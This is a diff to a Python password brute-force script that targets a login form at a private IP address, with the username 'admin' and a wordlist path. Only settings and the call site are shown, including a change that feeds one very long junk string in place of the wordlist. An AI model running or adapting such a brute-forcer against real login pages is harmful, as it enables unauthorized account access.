@@ -9,7 +9,7 @@ from html.parser import HTMLParser
 # general settings
 user_thread = 10
 username = "admin"
-wordlist_file = "/root/PycharmProjects/LogingBypass/dic.txt"
+wordlist_file = "/root/PycharmProjects/LoginAttacks/BruteForce/dic.txt"
 resume = None
 
 # target specific settings
@@ -17,7 +17,7 @@ target_url = "http://192.168.1.50"
 target_post = "http://192.168.1.50"
 
 username_field = "user"
-password_field = "user"
+password_field = "password"
 
 success_check = "Tabla de contadores"
 
@@ -125,6 +125,9 @@ def build_wordlist(wordlist_file):
     return words
 
 
-words = build_wordlist(wordlist_file)
+#words = build_wordlist(wordlist_file)
+words = queue.Queue()
+words.put('afdsfdsgfdshgfdsgfdkfldsjfkldshflkjdsflkdsjnflkjdsnkjfhdsjkhfjkdshfkljdsklfjldsafdsfdsgfdshgfdsgfdkfldsjfkldshflkjdsflkdsjnflkjdsnkjfhdsjkhfjkdshfkljdsklfjldsafdsfdsgfdshgfdsgfdkfldsjfkldshflkjdsflkdsjnflkjdsnkjfhdsjkhfjkdshfkljdsklfjldsafdsfdsgfdshgfdsgfdkfldsjfkldshflkjdsflkdsjnflkjdsnkjfhdsjkhfjkdshfkljdsklfjldsafdsfdsgfdshgfdsgfdkfldsjfkldshflkjdsflkdsjnflkjdsnkjfhdsjkhfjkdshfkljdsklfjlds')
+
 bruter_obj = Bruter(username, words)
 bruter_obj.run_bruteforce()
